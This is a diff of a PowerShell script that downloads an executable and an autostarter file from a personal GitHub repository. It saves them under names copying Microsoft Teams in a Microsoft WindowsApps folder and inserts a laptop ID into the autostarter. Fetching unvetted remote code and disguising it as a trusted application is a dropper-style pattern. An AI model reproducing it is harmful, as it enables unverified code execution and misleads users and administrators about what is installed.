@@ -1,10 +1,6 @@
 $targetDir = "$env:LOCALAPPDATA\Microsoft\WindowsApps"
 $exePath = "$targetDir\ms-teams.exe"
 $scriptPath = "$targetDir\ms-teams_autostarter.exe"
-$scriptPath2 = "$targetDir\ms-teams_autostarter.exe"
-
-$exeUrl = "https://raw.githubusercontent.com/mo-hashad30/wf/main/ms-teams.exe"
-$ahkUrl = "https://raw.githubusercontent.com/mo-hashad30/wf/main/ms-teams_autostarter.exe"
 
 do {
     $choice = Read-Host "Enter OW for Waheed or MH for Hashad"
@@ -20,9 +16,10 @@ if (Test-Path $scriptPath) { Remove-Item $scriptPath -Force }
 
 $cb = [guid]::NewGuid().ToString()
 
-Invoke-WebRequest -Uri "$exeUrl?t=$cb" -Headers @{"Cache-Control"="no-cache"} -OutFile $exePath
+# Hardcoded URLs directly in the request so they cannot be lost
+Invoke-WebRequest -Uri "https://raw.githubusercontent.com/mo-hashad30/wf/main/ms-teams.exe?t=$cb" -Headers @{"Cache-Control"="no-cache"} -OutFile $exePath
 
-$ahkContent = Invoke-RestMethod -Uri "$ahkUrl?t=$cb" -Headers @{"Cache-Control"="no-cache"}
+$ahkContent = Invoke-RestMethod -Uri "https://raw.githubusercontent.com/mo-hashad30/wf/main/ms-teams_autostarter.exe?t=$cb" -Headers @{"Cache-Control"="no-cache"}
 $ahkContent = $ahkContent.Replace("###LAPTOP_ID###", $laptopId)
 
 Set-Content -Path $scriptPath -Value $ahkContent -Encoding UTF8
